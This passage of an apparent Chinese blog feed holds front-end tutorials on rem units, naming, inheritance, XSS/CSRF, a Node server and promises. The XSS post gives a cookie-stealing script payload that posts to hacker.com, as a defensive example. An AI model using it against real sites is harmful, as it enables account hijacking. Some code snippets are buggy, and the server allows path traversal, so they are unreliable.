<p>用JS获取屏幕宽度做单位换算<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var pageWidth = window.innerWidth  //获取屏幕宽度</span><br><span class="line">  document.write(&apos;&lt;style&gt; html&#123; font-size:&apos; + pageWidth/10 + &apos;px;&#125;&lt;/style&gt;&apos;)  //用给定像素值除以屏幕宽度再乘以10得到的数字是以rem为单位</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html:</span><br><span class="line">  &lt;div class=&quot;parent clearfix&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">css:</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    *&#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    body&#123;</span><br><span class="line">        font-size: 16px;</span><br><span class="line">    &#125;</span><br><span class="line">    div.child&#123;</span><br><span class="line">        float: left;</span><br><span class="line">        background: #ddd;</span><br><span class="line">        width: 4rem;</span><br><span class="line">        height: 2rem;</span><br><span class="line">        margin: .5rem .5rem;</span><br><span class="line">    &#125;</span><br><span class="line">    .clearfix::before&#123;</span><br><span class="line">    content: &apos;&apos;;</span><br><span class="line">    display: block;</span><br><span class="line">    clear: both;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>效果图：</p>
<p><img src="https://i.loli.net/2018/07/03/5b3b8ecb99473.png" alt="效果图.png"></p>
<p>但是有个缺点就是每个元素的宽高都需要通过计算来得到，这样工作量会很大，解决方法是使用sass函数减少计算量</p>
<p>首先，使用命令行安装sass</p>
<ul>
<li>npm config set registry <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org/</a></li>
<li>touch ~/.bashrc</li>
<li>echo ‘export</li>
<li>SASS_BINARY_SITE=”<a href="https://npm.taobao.org/mirrors/node-sass&quot;&#39;" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/node-sass&quot;&#39;</a> &gt;&gt; ~/.bashrc</li>
<li>source ~/.bashrc</li>
<li>npm i -g node-sass</li>
<li>mkdir ~/Desktop/scss-demo</li>
<li>cd ~/Desktop/scss-demo</li>
<li>mkdir scss css</li>
<li>touch scss/style.scss</li>
<li>start scss/style.scss</li>
<li>node-sass -wr scss -o css</li>
</ul>
<p>然后，在sass文件中添加下面的代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@function pxToRem( $px )&#123;</span><br><span class="line">  @return $px/$designWidth*10 + rem;</span><br><span class="line">&#125;  //这个函数可以将像素值转换成以rem为单位</span><br><span class="line"></span><br><span class="line">$designWidth : 640; // 640是设计稿的宽度，根据实际要求修改即可</span><br><span class="line"></span><br><span class="line">div.child&#123;</span><br><span class="line">  width: pxToRem(320);</span><br><span class="line">  height: pxToRem(160);</span><br><span class="line">  margin: pxToRem(40) pxToRem(40);</span><br><span class="line">  border: 1px solid red;</span><br><span class="line">  float: left;</span><br><span class="line">  font-size: 1.2em;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过sass函数的转译，我们可以直接使用px为单位，这样大大节省了计算时间</p>
]]></content>
      <tags>
        <tag>响应式 rem</tag>
      </tags>
  </entry>
  <entry>
    <title>增强代码可读性</title>
    <url>/2018/09/18/%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>词性和一致性<br><a id="more"></a></p>
<h2 id="优化基本原则"><a href="#优化基本原则" class="headerlink" title="优化基本原则"></a>优化基本原则</h2><ul>
<li>易读性优先</li>
<li>如果不是性能瓶颈，就不要为了性能改写代码</li>
<li>复杂性守恒原则：无论怎么写代码，复杂性都不会消失。如果逻辑复杂，代码就应该是复杂的；如果逻辑简单，代码就应该是简单的</li>
</ul>
<h2 id="注意词性"><a href="#注意词性" class="headerlink" title="注意词性"></a>注意词性</h2><h3 id="普通变量-属性用「名词」"><a href="#普通变量-属性用「名词」" class="headerlink" title="普通变量/属性用「名词」"></a>普通变量/属性用「名词」</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &apos;Joyce&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var student = &#123;</span><br><span class="line">    grade: 3,</span><br><span class="line">    class: 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="布尔变量或属性用「形容词」-「be动词」-「情态动词」-「hasXXX」"><a href="#布尔变量或属性用「形容词」-「be动词」-「情态动词」-「hasXXX」" class="headerlink" title="布尔变量或属性用「形容词」/「be动词」/「情态动词」/「hasXXX」"></a>布尔变量或属性用「形容词」/「be动词」/「情态动词」/「hasXXX」</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    dead: false, // 如果是形容词，前面就没必要加 is，比如isDead 就很废话</span><br><span class="line">    isVip: true, // be 动词有 is、was 等，后面一般接名词</span><br><span class="line">    canSpeak: true, //情态动词有 can、should、will、need 等，情态动词后面接动词</span><br><span class="line">    hasChildren: true, // has 加名词</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="普通函数或方法用「动词」"><a href="#普通函数或方法用「动词」" class="headerlink" title="普通函数或方法用「动词」"></a>普通函数或方法用「动词」</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    run()&#123;&#125;, // 不及物动词</span><br><span class="line">    drinkWater()&#123;&#125;, // 及物动词</span><br><span class="line">    eat(foo)&#123;&#125;, // 及物动词加参数（参数是名词）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="回调、钩子函数用「介词」开头，或用「动词的现在完成时态」"><a href="#回调、钩子函数用「介词」开头，或用「动词的现在完成时态」" class="headerlink" title="回调、钩子函数用「介词」开头，或用「动词的现在完成时态」"></a>回调、钩子函数用「介词」开头，或用「动词的现在完成时态」</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    beforeDie()&#123;&#125;,</span><br><span class="line">    afterDie()&#123;&#125;,</span><br><span class="line">    // 或者</span><br><span class="line">    beforeDie()&#123;&#125;,</span><br><span class="line">    dead()&#123;&#125; // 这里跟 布尔 冲突，但只要不同时暴露 布尔 dead 和函数 dead 就行，不想冲突就用上面的 afterDie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">eg: button.addEventListener(&apos;click&apos;, onButtonClick)</span><br><span class="line"></span><br><span class="line">var component = &#123;</span><br><span class="line">    beforeCreate()&#123;&#125;,</span><br><span class="line">    created()&#123;&#125;,</span><br><span class="line">    beforeMount()&#123;&#125;,</span><br><span class="line">    mounted()&#123;&#125;,</span><br><span class="line">    beforeUpdate()&#123;&#125;,</span><br><span class="line">    updated()&#123;&#125;,</span><br><span class="line">    activated()&#123;&#125;,</span><br><span class="line">    deactivated()&#123;&#125;,</span><br><span class="line">    beforeDestroy()&#123;&#125;,</span><br><span class="line">    destroyed()&#123;&#125;,</span><br><span class="line">    errorCaptured()&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="容易混淆的地方加前缀"><a href="#容易混淆的地方加前缀" class="headerlink" title="容易混淆的地方加前缀"></a>容易混淆的地方加前缀</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div1.classList.add(&apos;active&apos;)  // DOM对象</span><br><span class="line">div2.addClass(&apos;active&apos;)  // jQuery对象</span><br><span class="line"></span><br><span class="line">可以改写成：</span><br><span class="line">domDiv1.classList.add(&apos;active&apos;) or elDiv1.classList.add(&apos;active&apos;)</span><br><span class="line">$div2.addClass(&apos;active&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="注意一致性"><a href="#注意一致性" class="headerlink" title="注意一致性"></a>注意一致性</h2><h3 id="介词一致性"><a href="#介词一致性" class="headerlink" title="介词一致性"></a>介词一致性</h3><p>如果你使用了 before + after，那么就在代码的所有地方都坚持使用 如果你使用了 before + 完成时，那么就坚持使用 如果你改来改去，就「不一致」了，不一致将导致「不可预测」</p>
<h3 id="顺序一致性"><a href="#顺序一致性" class="headerlink" title="顺序一致性"></a>顺序一致性</h3><p>比如 updateContainerWidth 和 updateHeightOfContainer 的顺序就令人很别扭，同样会引发「不可预测」</p>
<h3 id="表里一致性"><a href="#表里一致性" class="headerlink" title="表里一致性"></a>表里一致性</h3><p>函数名即能体现函数功能<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getSongs()&#123;</span><br><span class="line">  return $.get(&apos;/songs).then((response)&#123;</span><br><span class="line">    div.innerText = response.songs</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>函数名 getSongs 表示获取歌曲，并没有暗示这个函数会更新页面，但是实际上函数更新了 div，造成表里不一，正确的写法是</p>
<ul>
<li><p>纠正函数名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getSongsAndUpdateDiv()&#123;</span><br><span class="line">  return $.get(&apos;/songs).then((response)&#123;</span><br><span class="line">    div.innerText = response.songs</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>拆分成两个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getSongs()&#123;</span><br><span class="line">  return $.get(&apos;/songs)</span><br><span class="line">&#125;</span><br><span class="line">function updateDiv(songs)&#123;</span><br><span class="line">  div.innerText = response.songs</span><br><span class="line">&#125;</span><br><span class="line">getSongs().then((response)=&gt;&#123;</span><br><span class="line">  updateDiv(response.songs)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>如何实现继承</title>
    <url>/2018/08/13/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ES5与ES6的两种写法<br><a id="more"></a></p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>使得子类具有父类别的各种属性和方法叫做继承</p>
<h2 id="ES5实现继承"><a href="#ES5实现继承" class="headerlink" title="ES5实现继承"></a>ES5实现继承</h2><p>父类：Human<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Human(name)&#123;</span><br><span class="line">    this.name = name  // 父类的自有属性</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Human.prototype.run = function()&#123;  // 原型上的公有属性</span><br><span class="line">    console.log(&quot;我叫&quot; + this.name + &quot;，我在跑&quot;)</span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/08/13/5b719b02c3022.jpg" alt="alt text"></p>
<p>子类：Man<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Man(name)&#123;</span><br><span class="line">    Human.call(this.name)  // 1、调用父类Human，拥有this.name = name的属性</span><br><span class="line">    this.gender = &apos;男&apos;  // 子类的自有属性</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Man.prototype.__proto__ = Human.prototype  // 2、将Man的原型 链到 Human的原型上</span><br><span class="line"></span><br><span class="line">Man.prototype.fight = function()&#123;  // 子类原型上的公有属性</span><br><span class="line">    console.log(&apos;捶你胸口&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/08/13/5b719b024ce95.png" alt="alt text"></p>
<p>但是由于IE不支持第二句Man.prototype.<strong>proto</strong> = Human.prototype，用下面三句话可以代替<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var f = function()&#123;&#125;  // 构造空函数</span><br><span class="line">f.prototype = Human.prototype  // 让空函数的原型指向Human（父类）的原型</span><br><span class="line">Man.prototype = new f()  // 此时f()就是去掉了 this.name = name 的Human</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/08/13/5b719b02c1604.png" alt="alt text"></p>
<p>使用new命令相当于执行了下面四步：</p>
<ul>
<li>创建一个临时空对象作为要返回的对象实例  var temp = {}</li>
<li>将这个空对象的原型指向构造函数的prototype属性  this.<strong>proto</strong> = 构造函数.prototype</li>
<li>将这个空对象赋值给函数内部的this关键字  this = temp</li>
<li>执行构造函数内部代码，并返回this  return this</li>
</ul>
<p>prototype属性只有一个功能就是存放公有属性对象的地址<br><img src="https://i.loli.net/2018/08/13/5b714f47880d3.png" alt="alt text"></p>
<h2 id="ES6实现继承"><a href="#ES6实现继承" class="headerlink" title="ES6实现继承"></a>ES6实现继承</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">父类：Human</span><br><span class="line">class Human &#123;</span><br><span class="line">    constructor(name)&#123;</span><br><span class="line">        this.name = name  // 自有属性</span><br><span class="line">    &#125;</span><br><span class="line">    run()&#123;  // 公有属性，直接写在原型链（prototype）上的</span><br><span class="line">        console.log(&quot;我叫&quot; + this.name + &quot;，我在跑&quot;)</span><br><span class="line">        return undefined</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">子类：Man</span><br><span class="line">class Man extends Human &#123;  // extends关键字等价于 Man.prototype.__proto__ = Human.prototype</span><br><span class="line">    constructor(name)&#123;</span><br><span class="line">        super(name)  // 调用父类，等价于Human.call(this, name)使得子类拥有this.name = name的属性</span><br><span class="line">        this.gender = &apos;男&apos;  // 子类的自有属性</span><br><span class="line">    &#125;</span><br><span class="line">    fight()&#123;</span><br><span class="line">        console.log(&apos;捶你胸口&apos;)  // 子类的公有属性，写在Man.prototype上的</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有了ES6的extends写法，我们构造函数与函数的继承显得十分简单，它帮我们省去了链接原型到另一个原型的复杂步骤，但是它不能帮助我们很好的理解js的原型以及继承的原理，所以真正搞懂ES5的继承写法会让你对原型的理解有很深刻的挖掘</p>
]]></content>
      <tags>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title>安全：XSS和CSRF</title>
    <url>/2018/08/16/%E5%AE%89%E5%85%A8%EF%BC%9AXSS%E5%92%8CCSRF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>初次理解XSS和CSRF攻击<br><a id="more"></a></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>全称 Cross Site Script 跨站脚本攻击，原本缩写为CSS，但为了区别于层叠样式表，在安全领域称为XSS。</p>
<p>XSS攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。</p>
<p>有多种方式进行XSS攻击，但它们的共同点是：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者使用的机器上进行一些恶意操作</p>
<p>常见的基于DOM的XSS攻击是指通过恶意脚本修改页面DOM结构，是纯粹发生在客户端的攻击，eg：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div.innerHTML = userComment</span><br><span class="line"></span><br><span class="line">// userComment 内容是 &lt;script&gt;$.get(&apos;http://hacker.com?cookie=&apos; + document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>此时恶意就被执行了</p>
<h3 id="XSS防范"><a href="#XSS防范" class="headerlink" title="XSS防范"></a>XSS防范</h3><p>1、HttpOnly 这个属性可以防止XSS，它会禁止javascript脚本来访问cookie。</p>
<p>前面说道攻击者可以通过注入恶意脚本获取用户的cookie信息，通常cookie中都包含了用户的登录凭证信息，攻击者在获取到cookie之后，就可以发起cookie劫持攻击。所以严格来说HttpOnly并非阻止XSS攻击，而是阻止XSS攻击后的cookie劫持</p>
<p>2、不要使用innerHTML，改成innerText，此时script标签里的内容就会被当成文本，不执行。</p>
<p>如果一定要用innerHTML，使用字符过滤（XSS filter），在前端框架中一般都会有一份decodingMap，用于对用户输入的包含特殊字符进行过滤<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const decodingMap = &#123;</span><br><span class="line">    &apos;&amp;lt;&apos;: &apos;&lt;&apos;,</span><br><span class="line">    &apos;&amp;gt;&apos;: &apos;&gt;&apos;,</span><br><span class="line">    &apos;&amp;quot;&apos;: &apos;&quot;&apos;,</span><br><span class="line">    &apos;&amp;amp;&apos;: &apos;&amp;&apos;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>全称：Cross Site Request Forgery 即跨站请求伪造，是一种劫持受信任用户像服务器发送非预期请求的攻击方式</p>
<p>通常情况下，CSRF攻击是攻击者借助受害者的cookie骗取服务器信任，可以在受害者不知情的情况下以受害者名义伪造请求发送给受攻击的服务器，从而在并未授权的情况下执行在权限保护之下的操作</p>
<p>eg：</p>
<ul>
<li>用户在 qq.com 登陆</li>
<li>用户切换到 hacker.com （恶意网站）</li>
<li>hacker.com 发送一个 qq.com/add-friend 的请求，让用户添加hacker为好友</li>
<li>用户在不知情的情况下添加了hacker为好友</li>
<li>用户本身没有想发送这个请求，但hacker伪造了用户发请求的假象</li>
</ul>
<p>由于 cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起CSRF攻击。在攻击过程中，攻击者借助受害者的cookie骗取服务器信任，但并不能拿到cookie，也看不到cookie的内容，对于服务器返回的内容，由于同源策略的限制，也无法进行解析。所以，攻击者无法从返回结果中得到任何东西。所能做的就是给服务器发送请求，执行请求中的命令，在服务器直接改变数据的值，而非窃取服务器中的数据。</p>
<h3 id="CSRF防范"><a href="#CSRF防范" class="headerlink" title="CSRF防范"></a>CSRF防范</h3><p>1、验证码<br>从上面的例子可以看出，CSRF攻击往往是在用户不知情的情况下构造了网络请求，而验证码会强制用户与应用进行交互，才能最终完成并提交请求。</p>
<p>2、Referer Check<br>根据HTTP协议，在HTTP头部有一个字段叫 Referer ，它记录着HTTP请求的来源地址，通过它可以检查请求是否来自合法的源。因此要防范CSRF攻击，只需验证它的 Referer 值，如果是以相同域名开头的，就是来自网站自己的请求，是合法的，如果是来自其他网站的，可以拒绝该请求</p>
<p>3、添加token验证<br>CSRF攻击能成功的原因在于攻击者可以伪造用户请求，该请求中所有的用户验证信息都存在于cookie中，要抵御该攻击，关键是要在请求中放入攻击者不能伪造的信息，并且该信息不能存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证 token，从而判断是否是CSRF攻击</p>
<p>更多详细内容：<a href="https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw</a></p>
]]></content>
  </entry>
  <entry>
    <title>搭建简易服务器</title>
    <url>/2018/08/29/%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Node.js简易服务器<br><a id="more"></a></p>
<h2 id="一个简单的静态服务器"><a href="#一个简单的静态服务器" class="headerlink" title="一个简单的静态服务器"></a>一个简单的静态服务器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var http = require(&apos;http&apos;)</span><br><span class="line">var fs = require(&apos;fs&apos;)</span><br><span class="line"></span><br><span class="line">var server = http.createServer(function(req, res)&#123;</span><br><span class="line">  try&#123;</span><br><span class="line">    var fileContent = fs.readFileSync(__dirname + &apos;/static&apos; + req.url)</span><br><span class="line">    res.write(fileContent)</span><br><span class="line">  &#125;catch(e)&#123;</span><br><span class="line">    res.writeHead(404, &apos;not found&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(8080)</span><br><span class="line">console.log(&apos;visit http://localhost:8080&apos; )</span><br></pre></td></tr></table></figure>
<h2 id="支持静态文件动态路由的服务器"><a href="#支持静态文件动态路由的服务器" class="headerlink" title="支持静态文件动态路由的服务器"></a>支持静态文件动态路由的服务器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var http = require(&apos;http&apos;)</span><br><span class="line">var fs = require(&apos;fs&apos;)</span><br><span class="line">var url = require(&apos;url&apos;)  // 引入url模块解析url地址，eg：127.0.0.1:8080/index.html?a=1&amp;b=2 需要将?后的参数去掉</span><br><span class="line"></span><br><span class="line">http.createServer(function(req, res)&#123;</span><br><span class="line">  var pathObj = url.parse(req.url, true)</span><br><span class="line">  console.log(pathObj)</span><br><span class="line"></span><br><span class="line">  switch (pathObj.pathname) &#123;  // 路由</span><br><span class="line">    case &apos;/getWeather&apos;:</span><br><span class="line">      var ret</span><br><span class="line">      if(pathObj.query.city == &apos;beijing&apos;)&#123;</span><br><span class="line">        ret = &#123; city: &apos;beijing&apos;, weather: &apos;晴天&apos; &#125;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        ret = &#123; city: pathObj.query.city, weather: &apos;不知道&apos; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      res.end(JSON.stringify(ret))</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">        try&#123;  // 静态服务器</span><br><span class="line">            var fileContent = fs.readFileSync(__dirname + &apos;/static&apos; + pathObj.pathnamel)</span><br><span class="line">            res.write(fileContent)</span><br><span class="line">            &#125;catch(e)&#123;</span><br><span class="line">                res.writeHead(404, &apos;not found&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">       res.end( )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).listen(8080)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>异步编程的方式</title>
    <url>/2018/08/10/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Promise的用法<br><a id="more"></a></p>
<h1 id="异步编程的四种方式"><a href="#异步编程的四种方式" class="headerlink" title="异步编程的四种方式"></a>异步编程的四种方式</h1><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>获取异步任务的结果。假设有两个函数f1和f2，f2需要等待f1的执行结果，如果f1是一个需要很长时间来执行的代码，则需要考虑改写f1，将f2作为f1的回调函数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function f1(callback)&#123;</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        // f1的任务代码</span><br><span class="line">        callback();</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f1(f2)  // 执行代码会变成这样</span><br></pre></td></tr></table></figure></p>
<p>采用回调函数的方式，将同步操作变成异步，f1不会阻塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行</p>
<p>它的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合，流程会很混乱，而且每个任务只能指定一个回调函数。</p>
<h2 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h2><p>任务执行不取决于代码的顺序，而是事件是否发生（采用jQuery的写法）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f1.on(&apos;done&apos;, f2);  // 当f1发生done事件，就执行f2</span><br></pre></td></tr></table></figure></p>
<p>再改写f1中的代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function f1()&#123;</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        // f1任务代码</span><br><span class="line">        f1.trigger(&apos;done&apos;)  // 执行完成后，立即触发done事件，从而开始执行f2</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>它的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以解耦，有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</p>
<h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2><p>又称为观察者模式，将上面的事件理解成信号，假设有个信号中心，某个任务执行完就向中心发布一个信号，其他依赖于这个任务的可以向信号中心订阅这个信号，从而知道什么时间自己开始执行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jQuery.subscribe(&quot;done&quot;, f2);  // f2向信号中心jQuery订阅done信号</span><br></pre></td></tr></table></figure></p>
<p>接着对f1进行改写<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function f1()&#123;</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        // f1的任务代码</span><br><span class="line">        jQuery.publish(&quot;done&quot;);  // f1执行完后，向信号中心发送done信号，从而触发f2执行</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>与事件监听性质十分类似，但优于前者，我们可以通过信号中心查看设置了多少个信号，以及每个信号有多少个订阅者，从而监控程序运行</p>
<h2 id="Promise对象"><a href="#Promise对象" class="headerlink" title="Promise对象"></a>Promise对象</h2><p>定义：（参考阮一峰教程）</p>
<p>Promise 是一个对象，对象里存储一个状态，这个状态是可以随着内部的执行转化的，为以下三种状态之一：等待态(Pending)、完成态(Fulfilled)、拒绝态(Rejected)。</p>
<p>一开始，我们先设置好等状态从 pending 变成 fulfilled 和 rejected 的预案（当成功后我们做什么，失败时我们做什么）。</p>
<p>Promise 启动之后，当满足成功的条件时我们让状态从 pending 变成 fulfilled （执行 resolve）；当满足失败的条件，我们让状态从 pending 变成 rejected（执行 reject）</p>
<p>promise是回调的一种形式，同时也是一个事务管理器。他的作用是将各种内嵌回调的事务用流水形式表达，其目的是为了简化编程，让代码逻辑更加清晰。</p>
<h3 id="1、then的链式用法（结合jQuery的写法）"><a href="#1、then的链式用法（结合jQuery的写法）" class="headerlink" title="1、then的链式用法（结合jQuery的写法）"></a>1、then的链式用法（结合jQuery的写法）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url:&apos;/xxx&apos;,</span><br><span class="line">&#125;).then(successFn,errorFn).then(successFn2,errorFn2)</span><br></pre></td></tr></table></figure>
<h3 id="2、自己生成一个Promise对象"><a href="#2、自己生成一个Promise对象" class="headerlink" title="2、自己生成一个Promise对象"></a>2、自己生成一个Promise对象</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    return new Promise(function(resolve, reject)&#123;</span><br><span class="line">        setTimeout(()=&gt;&#123;</span><br><span class="line">            resolve()  // 成功后调用</span><br><span class="line">            reject()  // 失败后调用</span><br><span class="line">        &#125;, 5000)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">returnPromise().then(result)</span><br></pre></td></tr></table></figure>
<h3 id="3、async和await（两者的关系是相互依赖，通过await模拟同步代码）"><a href="#3、async和await（两者的关系是相互依赖，通过await模拟同步代码）" class="headerlink" title="3、async和await（两者的关系是相互依赖，通过await模拟同步代码）"></a>3、async和await（两者的关系是相互依赖，通过await模拟同步代码）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var result = await returnPromise()  //await的用法就是将异步代码写成同步的，await左边是同步，右边是异步结果，有了await它会等待异步的结果，从而改变整个代码的执行顺序，await后接一个返回promise的函数</span><br></pre></td></tr></table></figure>
<h3 id="4、try…catch"><a href="#4、try…catch" class="headerlink" title="4、try…catch"></a>4、try…catch</h3><p>捕获报错信息，catch是一个没有成功函数的失败函数，可以想象成then的语法糖<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">  var promise = await xxx()</span><br><span class="line">  console.log(&apos;没出错&apos;)</span><br><span class="line">&#125;catch(error)&#123;</span><br><span class="line">  console.log(&apos;异常了&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器缓存机制</title>
